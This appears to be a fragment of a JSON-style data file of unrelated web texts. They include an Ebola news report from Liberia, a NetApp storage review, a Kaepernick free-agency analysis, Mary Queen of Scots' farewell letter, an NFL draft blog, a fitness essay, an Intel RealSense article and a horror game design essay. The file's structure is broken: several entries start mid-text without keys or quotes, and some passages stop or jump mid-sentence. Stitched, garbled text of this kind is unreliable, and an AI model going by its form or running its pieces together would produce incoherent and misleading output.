It is a severe, often fatal disease in humans and nonhuman primates. File Photo by National Institute of Allergy and Infectious Diseases. | License Photo\n\nGENEVA, Switzerland, Nov. 20 (UPI) -- A 10-year-old boy in Liberia has been diagnosed with Ebola two months after the country was declared free from the virus.\n\nDr. R. Bruce Aylward of the World Health Organization announced the development during a press conference Friday in Geneva.\n\n\"About 24 hours ago, we learned of a new case in Liberia,\" Aylward said. \"This is a 10-year-old boy who became sick on the 14th of November and who was confirmed yesterday as Ebola virus-positive.\"\n\nAylward, the executive director of outbreaks and health emergencies at WHO, said he didn't have detailed information about the boy.\n\n\"The child has no known history of contact with a survivor,\" he said. \"But as the investigation goes forward...we will start to see more clarity.\" The boy's family is being tested for the virus, he said.\n\nLiberia was first declared Ebola-free in early May before reporting four new cases weeks later. The country was most recently declared liberated from the epidemic on Sept. 3. This is the first case of Ebola that is not believed to be associated with the initial 2014 outbreak.",
  "latent_110": "Analysis Every two years or so NetApp brings out a new E Series flash box that stores more and goes faster than the last one. This month we have the EF570 arriving, updating the 2015-launched EF560. NetApp claims benchmark-backed price/performance leadership and NVMe-over-fabrics support, and we reckon this deservers a closer look.\n\nThe E-Series flash arrays are intended for on-premises high-access rate work such as big data analytics, intensive video surveillance analysis and that sort of thing, leaving general CSP-type work to the SolidFire arrays and fast storage access in the ONTAP environment to NetApp's all-flash FAS arrays.\n\nCompared to the EF560, the new box has significantly faster interfaces, large-capacity SSDs and better performance. There must be a brace of better Xeon CPUs in its two controllers but NetApp hasn't yet revealed any details.\n\nThe EF560 delivered 825,000 sustained IOPS while the EF570 goes up to one million of them\n\nThe EF560's system memory was 24GB while the EF570's ranges from 32 to 128GB.\n\nThe EFG560's average latency was <300µs - <800μs while the EF570 provides <100µs - <300μs, enabling NetApp to claim a sub-100 microsecond response\n\nMaximum capacity on the 2U/24-bay box goes up from the EF560's 192TB to 367TB\n\nThe EF570 will scale out to 1.8PB\n\nSupported SSD capacities are 800GB, 1.6TB, 3.2TB, 15.3TB, and 1.6TB FIPS fir full drive encryption. The EF560 sported 400GB, 800GB, and 1.6TB SSDs\n\nThe EF650 supported 8 x 16Gbit/s Fibre Channel. The EF570 moves up to 8 x 32Gbit/s\n\nFor iSCSI the EF570 supports 8 x 10Gbit/s or 8 x 25Gbit/s Ethernet. The EF5650 was limited to 8 x 10Gbit/s\n\nThe EF560's 4 x 56Gbit/s InfiniBand support moves up to 4 x 100Gbit/s and an NVME over IB option is available\n\nThe 15.3TB SSDs could be Toshiba CM5s, which are 64-layer 3D NAND drives with dual-port, PCIe Gen 3 x4 NVMe connectivity. But there are Samsung 15l.36TB SAS SSDs also available; the PM1633a range. NetApp hasn't said which type it is using.\n\nThe E570 box uses v121.4 of the SANtricity operating system, which adds asynchronous and synchronous remote mirroring plus a Cloud Connector showing NetApp's Data Fabric is embracing the E Series more strongly.\n\nSPC-1 benchmark\n\nAs it did with the EF560, NetApp has provided an SPC-1 benchmark (PDF) for the EF570.\n\nThe SPC-1* result is 500,022 IOPS with a price/performance of $0.13/IOPS. The IOPS number is a long way below the leading DataCore Parallel Server score of 5,120,098.98 but not far behind that system's $0.10/IOPS price performance.\n\nAn all-flash FAS A700 is third in IOPS performance at 2,400,059.26. The EF560 scored 245,011.76, with the EF570 more than doubling that to be 17th in sheer IOPS performance ranking, as the chart shows:\n\nSPC-1 IOPS ranking. Click to enlarge\n\nThe EF570 is the fourth best price/performance SPC-1 system tested, with the top three positions being held by DataCore. It is the industry's best price/performance dual-controller array in SPC-1 terms, leaving the EF560 and its 10th placed $0.54 rating behind:\n\nSPC-1 price/performance\n\nSPC-2 benchmark\n\nThe SPC-2** benchmark shows that the E570 is in a class of its own. It achieved 17,337.75 MBPS with a price/performance of $3.69; a record. The MBPS rating is the 6th highest but the price/performance is the absolute lowest. Plotting SPC-2 results in a chart shows that the EF570 stands alone in the lower part of the chart;\n\nSPC-2 chart of price/performance and bandwidth. Click to enlarge\n\nThe EF560 SPC-2 benchmark configuration used multiple 12Gbit/s SAS connections to the host servers and, we understand, SAS-connected SSDs. This means we don't have an NVMe-over-fabrics performance data for the array.\n\nWe don't have an EF560 SPC-2 result for comparison, nor any DataCore results, possibly just as well. NetApp says the EF570 \"has demonstrated the world's leading price/performance results for both SPC-1 and SPC-2 benchmarks in the same system. With price/performance ratios of $0.13/SPC-1 IOPS and $3.69/SPC-2 MBPS, NetApp has established its standing as the storage industry's price/performance leader for transactional and bandwidth workloads.\" True dat.®\n\nBootnote\n\n* The SPC-1 benchmark consists of a single workload designed to demonstrate the performance of a storage subsystem while performing the typical functions of business critical applications characterised by predominately random I/O operations and require both queries as well as update operations.\n\n** The SPC-2 Storage Performance Council benchmark calculates overall storage array performance in throughput (MB/sec) and (discounted) price/performance terms. These two numbers are calculated from three component workloads: large file processing; large database query; and video-on-demand.",

  "latent_425": "As Colin Kaepernick’s job hunt has crept into training camp, the parameters of debate have shifted. Just a few months ago, the contention was over whether or not Kaepernick was good enough to play in the league. That no longer seems to be the case. Last week, reports circulated that Baltimore Ravens head coach John Harbaugh and general manager Ozzie Newsome were both interested in signing Kaepernick, but were met with resistance by owner Steve Bisciotti, who framed hesitance over signing Kaepernick as a PR concern.\n\n“Your opinions matter to us,” Bisciotti said at a fan event, referring to fan opinion over Kaepernick. “We’re very sensitive to it, and we’re monitoring it, and we’re still, as Ozzie says, scrimmaging it, and we’re trying to figure out what’s the right tact. So pray for us.”\n\nKaepernick’s ability to play the position no longer seems to be in doubt. Players have spoken in support of Kaepernick, and most serious analysis reliant on game study arrives at the conclusion that Kaepernick is not just a competent quarterback, but is also better than he was when he led the 49ers to the Super Bowl in 2013. Cian Fahey, who catalogues quarterback performance at Pre-Snap Reads, found Kaepernick to have outplayed Ravens starter Joe Flacco.\n\nAnd yet Kaepernick doesn’t have a team. It’s obvious Kaepernick is being frozen out for his political opinions, but it’s less apparent how extraordinary it is that a player like him can’t find a team. Back in March, Neil Paine and I wrote about Kaepernick’s situation and noted that it was strange for even a halfway decent quarterback to remain unsigned so deep into free agency. Four months later, it’s no longer merely unusual — it’s practically unheard of.\n\nHere are the free agent quarterbacks from the past five offseasons, charted by their Total Quarterback Rating in the previous season and how many days they remained in free agency before being signed by a team. (The size of the dots represent the number of pass attempts.)\n\nNo above-average quarterback has been unemployed nearly as long as Kaepernick this offseason. The most comparable scenario — Ryan Fitzpatrick’s contract showdown with the New York Jets last offseason — isn’t really comparable at all, since Fitzpatrick was the one exerting leverage over the team, not the other way around.\n\nIt’s easy to lose sight of the reality that good quarterbacks often never even reach free agency, let alone remain unsigned for so long. That’s especially the case for our discussion of Kaepernick, which has shifted from his merit as a player to concern-trolling and a consideration of business practicalities. So while Kaepernick is clearly an outlier on the chart above, the fact that he’s on it at all should be just as surprising.\n\nAdditional research by Neil Paine",

I have asked for my papers, which they have taken away, in order that I might make my will, but I have been unable to recover anything of use to me, or even get leave either to make my will freely or to have my body conveyed after my death, as I would wish, to your kingdom where I had the honour to be queen, your sister and old ally.\n\nTonight, after dinner, I have been advised of my sentence: I am to be executed like a criminal at eight in the morning. I have not had time to give you a full account of everything that has happened, but if you will listen to my doctor and my other unfortunate servants, you will learn the truth, and how, thanks be to God, I scorn death and vow that I meet it innocent of any crime, even if I were their subject. The Catholic faith and the assertion of my God-given right to the English crown are the two issues on which I am condemned, and yet I am not allowed to say that it is for the Catholic religion that I die, but for fear of interference with theirs. The proof of this is that they have taken away my chaplain, and although he is in the building, I have not been able to get permission for him to come and hear my confession and give me the Last Sacrament, while they have been most insistent that I receive the consolation and instruction of their minister, brought here for that purpose. The bearer of this letter and his companions, most of them your subjects, will testify to my conduct at my last hour. It remains for me to beg Your Most Christian Majesty, my brother-in-law and old ally, who have always protested your love for me, to give proof now of your goodness on all these points: firstly by charity, in paying my unfortunate servants the wages due them - this is a burden on my conscience that only you can relieve: further, by having prayers offered to God for a queen who has borne the title Most Christian, and who dies a Catholic, stripped of all her possessions. As for my son, I commend him to you in so far as he deserves, for I cannot answer for him. I have taken the liberty of sending you two precious stones, talismans against illness, trusting that you will enjoy good health and a long and happy life. Accept them from your loving sister-in-law, who, as she dies, bears witness of her warm feeling for you. Again I commend my servants to you. Give instructions, if it please you, that for my soul's sake part of what you owe me should be paid, and that for the sake of Jesus Christ, to whom I shall pray for you tomorrow as I die, I be left enough to found a memorial mass and give the customary alms.\n\nWednesday, at two in the morning\n\nYour most loving and most true sister\n\nMari R\n\nFor the best part of twenty years until she died, Mary Stuart was either imprisoned or on trial in England at the behest of her first cousin, Elizabeth I . Her entire life was anything but normal, having been crowned Queen of Scots at nine months of age, married and widowed by the time she was seventeen, and even Queen of France for a short period. She also had her eye on the English throne , and that cemented her downfall. The following farewell letter was written by Mary, then aged 44, in the early hours of February 8th, 1587, to the brother of her deceased first husband . Just six hours later, as mentioned in the correspondence, she was beheaded in front of 300 witnesses.Transcript and translation follow.",

  "latent_633": "Follow us on Twitter at @HoustonBias\n\nJohnny Manziel\n\nBlake Bortles\n\nStrengths of BB's game include an above average arm-cannon, a prototypical profile, athleticism at the position, ability to read defenses and make adjustments at the line at the collegiate level, and versatility in offensive schemes. Negatives in Bortles game include questionable and inconsistent mechanics that lead to erratic accuracy, as well as shaky footwork. Most consider his mechanics and footwork easily correctable under the tutorship of a knowledge QB guru, which OB just so happens to be. Coaches beam about Bortles and boast about his work ethic, and intangibles. OB described him as a student of the game, and his coaches have seconded that sentiment. His ability to read defenses is certainly attractive, and is a skill that he should continue to improve. In an ideal world, you're spending a number one overall selection on a blue chip, nearly surefire franchise quarterback, but unfortunately that does not appear to be a luxury available in this draft class. Bortles is certainly an attractive prospect, and if his mechanical and footwork issues are as easily correctable as presumed, then i'm certainly all in. Bortles has an upper-tier elite level ceiling, I'm just very unsure of using a number one overall pick on a QB with serious mechanical flaws. If the Texans do indeed select Bortles with the first overall pick, or even drop down a couple slots to take him, keeping him on the bench for a stead while he fine tunes mechanical adjustments may be a very real possibility a la Aaron Rodgers. There may very well be an elite QB within that 6'5 frame, it's up to the Texans brass to decide if they believe they can bring it out of him.\n\nTeddy Bridgewater\n\nMay 8th will be upon us before we know it, and what the Texans will do with the first overall pick in the 2014 NFL draft remains cloudy. At this point it would appear trading down, or selecting Johnny Manziel, Blake Bortles, Jadeveon Clowney, or Teddy Bridgewater are the likely scenarios. With each of the guys projected to go near the top of the draft, there are issues or concerns with all of them ranging from mechanical issues, to projectability, to motor and work ethic concern. Names such a Khalil Mack, Jake Matthews, and Greg Robinson have been mentioned near the top of the first, but will likely slot into picks 2-7 with a slim chance of being selected number one overall by Texans brass. I'll preface this by saying I'm certainly not the most credible source in terms of evaluating the skillset of a QB and how they translate to the NFL, but below we'll hope to provide a somewhat thorough profile of the possible draftees.The legend of Johnny Football. Manziel embodies the phrase dynamic. The Aggie great experienced a brilliant college career becoming the first freshman to receive the Heisman trophy. Johnny Football is best known for his truly unique ability to improvise and extend plays, working very well outside of the pocket with his feet. Johnny enhanced virtually every aspect of his game his redshirt Sophomore year, most importantly his effectiveness within the pocket. On five fewer passing attempts, Johnny threw for 408 more yards, improved his completion percentage to 70%, on 9.6 yards per attempt with an impressive 37 touchdowns to 13 interceptions. Manziel also placed a greater emphasis on his arm, making 57 fewer rushing attempts during his 2013 campaign.Strengths in number two's game include his ability to extend plays, feel and elude pressure in the pocket, and short to intermediate accuracy with flashes of brilliant deepball placement. Johnny is a spark plug, a gunslinger, and a fiery competitor. The negatives in Johnny's game include reluctance to checkdown, a habbit of abandoning a closing pocket too often, and some question his mechanics, consistency in his deepball, ability to read defenses, and footwork. It remains to be seen how effective Johnny Football's legendary ability to extend plays will transfer to the next level, and his gunslinger mentality may get him into some turnover trouble. There are also the off the field concerns regarding his character, as well as his general size and how he'll be able to withstand the punishment an NFL quarterback with a tendency to scramble takes. I believe the size and character concerns to be asinine. The size argument is no longer valid after Drew Brees, and Russell Wilson shattered the stigma, Johnny is six feet tall, he can manage. The majority of character concerns arose over ESPN tabloid journalism. Bottom line is Johnny Manziel is special, he excels in the spotlight, and pundits such as Merrill Hodge who all but guarantee he will be a flat out bust should take a look at his game film against an NFL schemed Nick Saban defense. Those as well who argue he won't be able to assimilate into an NFL offensive scheme and develop into an standardized pocket QB should look at his 2013 numbers in the pocket, as well as open up to the realization that the position is evolving with several starting QB's sharing a similar skillset. The Texas native may very well bust, he may have the largest boom or bust deviation of any one of the QBs in talks at 1.1, who knows, but if he does reach his what I believe to be the highest of ceilings available in the draft, and he's not in Steel Blue, that will be a very bitter pill to swallow.The UCF QB shot up draft boards this year with fantastic play to go with an ideally projectable frame. The 6'5 232 pound playcaller helped put a growing UCF program on the map with a Fiesta Bowl championship over a strong Baylor Bears squad on the national stage. Bortles threw for a completion percentage of 68% on 3581 yards with 25 touchdowns to 9 interceptions during his 2013 Junior campaign. Bortles has one of the highest ceilings in the draft and in the right system could flourish. Bill O'Brien is a huge Bortles fan and had great things to say about number five after he beat his Lions this past college football season, as well as high praise for him after his fantastic pro-day this past week. Bortles would be an ideal fit into OB's system and as is, one would think he's number one on Coach O'Brien's board.The Louisville QB had a very successful collegiate career, and has spent the last two seasons garnering some Heisman attention. Bridgewater improved statistically across the board every year that he played, and jumped onto the national scene following a very impressive 2012 defeat of a stout Florida defense in the 2012 Sugar Bowl. This 2013 campaign Teddy posted brilliant numbers with a completion percentage of 71% on 3,970 yards, to go with 31 touchdowns to only FOUR picks. Bridgewater is slated as the number one QB from this draft class on most analysts boards and for good reason. Teddy is the most NFL ready QB, and has likely the lowest floor. With that being said, most analysts claim Bridgewater has most likely the lowest ceiling of the three QB's talked about at 1.1, I would argue otherwise and make the case he possesses franchise ability.Strengths in Bridgewater's game include his impressive pocket mobility and awareness, above-average arm strength, the ability to quickly run through his reads, great decision making, and good accuracy on short to intermediate routes. Bridgewater displays fantastic pocket presence and excellent footwork within. Negatives in Teddy's game include inconsistent accuracy on his deepball and worries over a poor pro-day which has some questioning his stock. As is, there are no true weaknesses that are that concerning in Bridgewater's game, and he would appear to posses the most poise and understanding of defenses. Although it remains to be seen how it translates to the NFL, Teddy displayed an excellent knack for preventing turnovers, reducing his INT% each collegiate year he played. That being said, Teddy is not afraid to take his shots downfield, and he keeps his eyes down field as he makes his progressions and is no stranger to stepping up in the pocket and driving the football. Teddy appears to have the most impressive mental make-up and at the end of the day, what's between the ears determines success at the next level. Period.Come draft day I would be fine with any of the three wearing steel blue and getting the keys to the car. I'm undecided as to which one I would prefer, and it depends on the day. Monday i'll be more than convinced that not selecting Johnny Football would be the dumbest damn thing the Texans could ever do, Come Tuesday i'll be enamored by Bortles projectability and potential working with OB, by Wednesday, sure that Teddy is the clear choice given his polish, and Thursday i'll be firmly entrenched in the Clowney camp petitioning for a QB to be taken at the top of the second. I'm not sure how it will be possible to pass on the best player in the draft in Jadeveon Clowney, and take an AJ McCarron, or Zach Mettenberger type at the top of the second. I'll close with this, it sure would be fun as hell to watch number two in a Texans uniform. In hindsight, passing on VY was certainly the right move but how bitter would it be if he had panned out and was handing it to us in Titans blue twice a year still. I would hate to see Johnny Manziel do just that. What do you believe the Texans should do with the number one pick in the 2014 NFL draft? Who's your QB?",

When I finally decided to get healthy, I couldn't continue to do that. I made a conscious decision to change where I hung out, who I hung out with and what we did when we were hanging out.\n\nThe majority of my friends are health-conscious, so I didn't think any of my relationships would change much. I was wrong.\n\nGoing out to eat is a rare occasion these days, and I can't remember the last time I had a drink. All of my free time is spent at the gym or doing something active. To maintain my active lifestyle I make sure I get a minimum of seven hours of sleep every night. Most of my friends are going out when I'm going to bed.\n\nI knew my best friends and I hadn't seen each other in a while, but in all the years we've known each other, we had never missed the \"big stuff.\" That morning, after my first race, I checked my phone. There were messages from both of them telling me how proud they were, but that New Year's Eve had gotten the best of them.\n\nLater, I explained how hurt I was that they weren't there. I found out they were hurt, too. They felt like they didn't \"fit into\" my life anymore.

The changes I've made and continue to make are permanent lifestyle investments in me and my ultimate goal of living the rest of my life as a healthy, happy, active adult.\n\nI've made new friends since the beginning of my journey. I'm a social person so I'm always going to have a group around. Some of that group has changed because I needed it to, but those who matter have weathered the changes with me and will always have my back no matter where life takes us.\n\nMy friends and I still don't see each other as often as we did, and probably never will.

  "latent_967": "Intel has very big plans for RealSense, the technology meant to enable our gadgets to learn and understand us, in order to better do the things we want. And the best way to achieve that? Make them mimic humans.\n\nToday at Intel's Developer Conference, CEO Brian Krzanich explained the company's advances with RealSense, calling it the \"sensification of compute.\" \"We want our devices to behave more like humans,\" Krzanich said. \"We want them to listen to us.\" To do that, Intel is increasing platform compatibility to include ROS, Linux, Unity, XSplit, Structure SDK, OSVR, and Google's Project Tango.\n\nIn one the most interesting.developments, Intel and Google are combining Project Tango (Google's 3D mapping project) and RealSense into an Android SDK. During this morning's conference they showed off a RealSense smartphone running Google's software. The phone was able to 3D-scan a room simply with a sweep of its camera, an application that should be useful for advancing indoor mapping technology or scanning everyday home items in 3D. Giving a phone the ability to better measure depth and render objects is a huge undertaking, but an important one as developers continue to experiment with smartphone mapping capabilities. \"3D mapping is going to absolutely take off ... this to me is a no-brainer,\" says President and Principal Analyst of Moor Insights & Strategy Patrick Moorhead. \"What takes a little more thought is scanning objects to print it out on a 3D printer.\" He says while type of application might not be mainstream for a couple more years (2017), it will gain steam with creatives.\n\nDevelopers using RealSense also announced a handful of projects and advancements. The most interesting plays into two of the most exciting fields experimenting with the Internet of Things: gaming and artificial intelligence. Razer has created a tiny USB-powered camera meant to sit on top of desktops or VR headsets that's supposed to better track gamers' movements and incorporate that feedback into the gaming experience. It's slated to be available in early 2016. And Savioke—the creator of that adorable robot butler we're all a little terrified of—will be adding RealSense to its virtual hotel concierge next year. It will help the bot do things like... well, for one, not run into people or walls.\n\nRealSense's impact goes much further than simply what we're now seeing in consumer-facing devices, though—and analysts believe Intel should be doing whatever it can to cement this platform. \"RealSense not only has the capability to dramatically expand device use cases, but also has the ability to drive processing requirements,\" Moorhead says. \"This is vitally important given many apps moving to the cloud. Intel should be spending hundreds of millions if not billions to make this happen. This is what it takes to make something stick in an ecosystem.\"\n\nIntel also showed off how RealSense can let you use a vending machine without touching it, for all the germaphobes out there, and the Memomi Memory Mirror, a high-tech mirror that helps you virtually try on clothes. Don't get too excited—the mirrors are only hitting Neiman Marcus stores at the moment.",

  "latent_1550": "The following blog post, unless otherwise noted, was written by a member of Gamasutras community.\n\nThe thoughts and opinions expressed are those of the writer and not Gamasutra or its parent company.\n\nContinuing were the Part 2 of this series left, here well talk about the presence and imminence of horrors.\n\nPresence\n\n“Panic is the sudden realization that everything around you is alive.”\n\n― William S. Burroughs, Ghost of Chance\n\nUnknown Presence\n\nSometimes it's not that we don't know what something looks like, but that we don't know where it is, and that can be a frightening experience. On the contrary, keeping our eyes on the threat makes us feel more secure about it. By looking at the source of terror we have a steady stream of information coming from it about when (imminence), if (intention) and how (nature) it will try to do anything that puts us in danger. If it moves, we'll know right away and react on time. If we don't have access to that information source, we cannot reliably evaluate the situation, and our minds will try to make up for that, again, extrapolating the limited information we have.\n\nThe feeling of being hunted, being preyed upon, being conspired against. Unknown presence goes beyond the simple spatial meaning of the word and ties closely to the notion of intention. More generally it's hiding itself entirely, but it could be concealing a weapon (unknown intention) or disguising it's nature (uncanny image) and the principle is still the same: that if it's hiding something, it's up to something bad.\n\nIn the more literal sense, the unknown presence most often tied with an unknown imminence. If something is possibly preying on you, it can attack you from anywhere (presence) any time (imminence). For that reason, the line between unknown presence and unknown imminence can be very blurry at times. But the feeling of being preyed upon – which is the most obvious use of this tool – elicited by our natura survival instincts (Player-Mechanics) is not the only form of unknown presence, there are other ways in which not knowing the location of a threat can be used to keep players on their toes.\n\nExample of unknown presence:\n\nSlender - The Arrival launch trailer:\n\nSlenderman: you never know where Slenderman is, not until it's too late.\n\nWhen the situation is inverted, and the player is the one sneaking around, it's also of extreme importance to know the whereabouts of the threats one's trying to remain concealed from. Acting undetected is a situation where more than anything else, information equals power. The presence of threats and the presence of the Virtual Player-Character are very connected things, as the fear generated by not knowing the presence of a threat is caused by being unsure about how to avoid it.\n\nBy providing extra-sensorial sources of information (motion scanners, x-ray vision, understanding the alarm state, visualizing the foe's cone of vision...), Stealth Fantasy titles empower players with everything they need to overcome the puzzles presented.\n\nClear light and shadow delimitations convey to the player where the binary safety and danger spaces meet each other, enemies are set up to contrast with the environment and walk in repetitive and predicting paths (known presence), and flashlights portray the angle and range of their vision.\n\nIn our specific case, where our focus of study is trying to understand how the Dynamics of fear emerge from the Mechanics of imperfect information – Fear of the Unknown –, what we have to look for is how the lack of that power affects the informee's (Real) mind-state when present in a context of (Virtual) danger and (Fictional) horror.\n\nSo let's see what that perfect information does for the player first, ignoring for now whatever are the Aesthetics used for providing that information. When given perfect information in a stealth-action situation, the players are able to understand the borders that divide safety and danger, the limits of the space they can use and the amount of risk they're subjecting themselves to at any given moment.\n\nAs an abstract and independent Game Mechanic, avoiding a saw blade and avoiding a line of sight are no different (not until the player fails at it). Both are about staying in safe space, avoiding dangerous space and making your time in risky space as short as possible.\n\nThe balance between safety, risk and danger, between safe space and unsafe space is the core point of stealth, concealment and, in our case, fear of the unknown presence . When the player doesn't have perfect information , the line between safety, risk and danger become blurred ( vague ) and the player can't be sure anymore about how much is the balance between safety and danger is in the situation. That specific feeling is the basis of everything we're studying here. One of it's more aligned interpretations of Fear Of The Unknown is the sense of unmeasurable risk .\n\nThe less information one has to act upon, the more thrilling that act feels. It can be either exciting or stressful depending on the Mechanics (using \"excitement\" and \"stress\" very lousily to categorize many things here, \"fear\" falling the side of stressful ones). When you're willingly taking a gamble for the fun of it it's more exciting than when you're forced to compromise planning and safety to fit a rushed ticking clock. Imposing a time for the player's action usually results in a more stressing version of the thrill.\n\nBut when the free will (\"player agency\") is not about time, but about space (or resources), a different thing happens and the weight of responsibility kicks in and suddenly being in control of one's own fate is the very source of stress – that's what makes Video-Games such a perfect format for Horror, as only this format can mimic life not only in Form (Fiction) but in Function (Virtuality). When you already checked every side route and realize the path that progresses the game is the only route left to take, to venture through the Unknown, that's scary.\n\nIf the player can simply blindly trust the designer/writer that nothing bad will actually happen in the Real or Virtual layers of the experience, and can simply keep going forward into unknown territory recklessly, the weight of that responsibility is gone. What happens is that again, there are no unmeasurable risks to be taken if all the risks are considered under a known threshold of \"balance\" that assures Virtual safety, even if Fictional danger still takes place – up to discussion if Plot Armor and Fictional danger can actually coexist, but since it's a pure-Fiction philosophic discussion I don't think it's worth pursuing.\n\nThe same is true for assured Virtual danger, in case of successive failure that turns fear into frustration by taking the unknown imminence factor away by rendering players cynical to the possibilities of success. Without hope there can be no fear. If the players stop caring about what will happen next – whatever be the cause for it – then you cannot threat them with unforeseen consequences anymore.\n\nNote that it's an aspect directly related to the player's experience and is very dependent on who your target audience is, what expectations they have, if they have an understanding of game balance and so on. Some times it still clicks, some times it fails miserably.\n\nThis puts us back in the \"Survival Horror vs. Power Fantasy\" spectrum and it's Game Design directives: should the player be informed for sure where the line between safety and danger lies? There's no one right answer, it always depends on what the design is trying to accomplish. When Fear of the Unknown is the goal, it makes sense to cripple the information given to the audience.\n\nVague Presence\n\nLimited information, the word vague means for us here, and such is the vague presence. Not so little information to fall into the (unknown but acknowledged) unknown, but not enough to render the player sure (even if wrong, in which at the point of discovery of the error it'd become uncanny) of said presence. That way we can consider any evidence of presence, existing or not, to be of vague nature.\n\nThe vague presence is what can be described as \"the unproven evidence of a threatening presence\".\n\nCommon sense says if you can't see or hear it right now, you don't know where it is, which would be a case of unknown presence. But specially in the case of Video-Games as they are currently, just hearing it or just encountering other evidences of a presence, and some times even actually seeing it are often not an assurance. There are at least two main sources for that:\n\n1) In the realm of Virtuality everything is possible, and laws of Reality don't necessarily apply. Players minimum experience with Video-Games know that smoke-and-mirrors design is easily achievable and very common in the Entertainment Software medium, and that many of the stuff that supposedly should be an evidence of presence of a threat is nothing more than a \"poltergeist script\" that can't do much more than a few loud noises and barks; and\n\n2) The Horror and Suspense genres of Fiction come with clichés and tropes known to the audience, which give them a very good idea of what to expect from a Mystery, Suspense or Horror story.\n\nThe combination of these two aspects makes otherwise strange and otherworldly things and events to be taken as normal within the Virtual and Fictional world of a Video-Game. Players know that art horror and terror will try to scare them. Players know weird things are expected to happen in Weird Fiction, that's why they're reading/watching/playing it to begin with.\n\nThose are aspects that supposedly should fall into the uncanny presence category in the realm of Reality, but under the rules, tropes and common trends of Horror Art in general and specially Video-Games, they're wide acceptance as \"natural\" things render the known and the uncanny into territory reserved to the vague.\n\nImportant to make here is a quick distinction between \"emergent unknownness\", when the player simply doesn't have track of the threat's whereabouts – as studied in the unknown presence section –, and \"scripted unknownness\", when false evidences (poltergeist scripts) are given to the player. This section refers essentially to the latter.\n\nGiving clues about the presence of a threat but holding back visual confirmation allows the player's mind to imagine the proximity of a terror by completing the information puzzle, while still being unsure of it's actual presence (vague). This works both ways, some times for making the uncertainty frightening and some times for causing the player too see clearly through the smoke-and-mirrors design and stop caring about the fake threat that just wants to scare the Real Player-Character (the player) but not to hurt the Virtual and Fictional Player-Character (the avatar and the character).\n\nIt's a tool that works well for many types of players, being specially effective when they're not much under the effects of Medium Awareness. For the most seasoned and self-aware players, the smoke-and-mirror design can lose all it's magic at the first realization of nothing being actually there (presence) and all that's going on is a combination script and audio tricks from which no Virtual (read \"Real\" inside the Virtual world) consequences can arise. Also, if there are Fictional-only \"consequences\", those are already decided in the player's fate by the interventionist god writers and there's nothing the Real Player-Character can do to stop them from happening, the players might ask \"why worry about those anyway? whatever will be, will be\".\n\nUltimately, the goal is to make the Fictional world feel Virtual and the Virtual world feel Real. However the designer can pull that, and it works, that's great. Also, not having much experience with video games can do wonder for the first experiences you get to play. There is an audience segment that is just getting to know the hobby, that don't have the same burden of knowledge most of us do, with fresh and unspoiled minds to what's possible, and we can and should totally target them too in some of our works.\n\nI remember back in school, my friends speculating about who or what takes the dead zombie bodies away in the first Resident Evil while you're in another room. Such a mystery remains unsolved.\n\nWhen used correctly, the vague presence is a very powerful form of the Closed Door device, which makes complete sense because the Closed Door device is also a form of vagueness and unknownness: a missing link of information that the player's mind will extrapolate (Player Mechanics), rendering the whole experience (Fictional, Virtual and Real) closer to feeling Real (Dynamics) than if the complete information was simply given, which would fail to create immersion (Dynamics).\n\nI know some of you might dislike the \"immersion\" word due to conflicts about what it means in terms of depth and nature, caused by the common confusion with Cognitive Immersion (which's what I mean), Sensorial Immersion (The Matrix), Deep Immersion (not knowing it's The Matrix), Liquid Immersion...\n\nWhile the use of the vague presence can be to make it seem like there's \"something\" around (and how it can fail if not used with care), the best effects come from the application where it goes beyond adding a something to the existing Virtual world, but when it adds a Fictional world to the something.\n\nAnd here's a question: the extrapolated portion of the Virtual world, created by the player's mind to fill the information gaps and give consistence to the rules, is it Fictional, Virtual or Real? The fact that it's hard to define only hints at how powerful it ultimately is. It goes beyond Video-Games, being present in Film, Comics, and Literature. It's what makes all Fiction feel Real, and it's the best goal to look for when using any tool.\n\nExample of vague presence:\n\nI saw something... It is right there... in the outside. What worked a decade ago doesn't necessarily work today, but the principle still remains and can be adjusted to fit todays savvy player's perceptions in order to weed out the designer's hand and give the Virtual world a sense of natural and seamless continuity that really feels like it goes beyond the play-field. Again, it wouldn't be fun if it wasn't challenging.\n\nUncanny Presence\n\nOther case of seemingly uncanny presence turned into vague presence in the realm of Video-Games is the relationship of the uncanny with the idea of disguise. At the heart of it, that's what the uncanny is and why it scares us: something disguising itself as something else is always creepy and dangerous. It cannot have good intentions.\n\nuncanny image is seemingly natural in aspect and keeps things clear, something trying to disguise it's own presence is a product of its behavior as opposed to it's nature and can be looked at as either vague or uncanny, all depending on how the player perceives it.\n\nTrue uncanny information is not supposed to make sense. In fact, it makes too much sense for things that cannot be. Some times to be more than one thing (as in the \"doll or human\" uncanny image case).\n\nNeedless to repeat, once stablished by the medium that the Virtual rules and the Fictional rules are not the same (Ludo-Narrative Dissonance), there's no such thing as \"impossible\" anymore, and the otherwise uncanny can sometimes become the \"normal\", some times even when the\n\nBut the uncanny is never alone, is always comes after the known and subverts it, and that's why it still works. As mentioned in the first part of this series, the uncanny is many times viewed in media as a form of \"plot twist\", but it's not necessarily the only form of it.\n\nFor those reasons, a common use of the uncanny presence in the Virtual world of Video-Games is the \"ghostly appearance\", when the player sees something that isn't really there. A ghostly appearance can have many different Fictional explanations, from actual ghosts, to visions, to hallucinations and so on, but Virtually they're the same thing. First the players sees something or someone spatially positioned play area, which's sufficient information to conclude it's there (known presence), then latter comes the realization it's not actually there, or has never been, and the previous information is proven wrong (uncanny).\n\nComing from the \"plot twist\" connections of the tool, it's one that works better the first few times it's pulled, before it becomes a \"known absence\" or \"known false presence\" for the informee, which can make it either fail as a form of uncanny presence, but also gives the design a new opening to subvert the current status of information back by making the \"false\" appearances be real the next time around, reestablishing the uncanny presence.\n\nExample of uncanny presence as ghostly appearance in Video-Games: First Encounter Assault Reckon: Point-man sees Alma multiple times through the game, usually as a ghostly appearance, but sometimes she is true, either in spatial presence or as an invader of the Fictional character's psyche.\n\nIf \"weird stuff happens in Horror Fiction\" and \"Video-Games usually break consistency rules\" are unavoidable tropes, it only means \"normality\" and \"rules\" aren't forms of the known that work well to be simply subverted into the uncanny. But information is limitless and there's always a new jumped-to conclusion to twist. Using uncanny image effectively is certainly easier than to do so with uncanny presence, that's because Fictional and Virtual image are essentially the same thing, but presence can be more dissonant between worlds layers. The lack of Mechanics in Fiction (specially the uncontrollable forces that are Player-Mechanics) makes everything easy and allows the designer to pull many forms of uncanny presence by using them exclusively in the Fictional world as, with anything Fictional, it's no different (nor harder) than using the same things in any other art-form capable of portraying Fiction. Example of uncanny presence in Fiction: The Village (2004) (Spoilers) The line between the idea of something disguising itself and of something disguised by design is another blurry spot when it comes to things that happen on the bridge between Real and Fictional (it is, the Virtual). 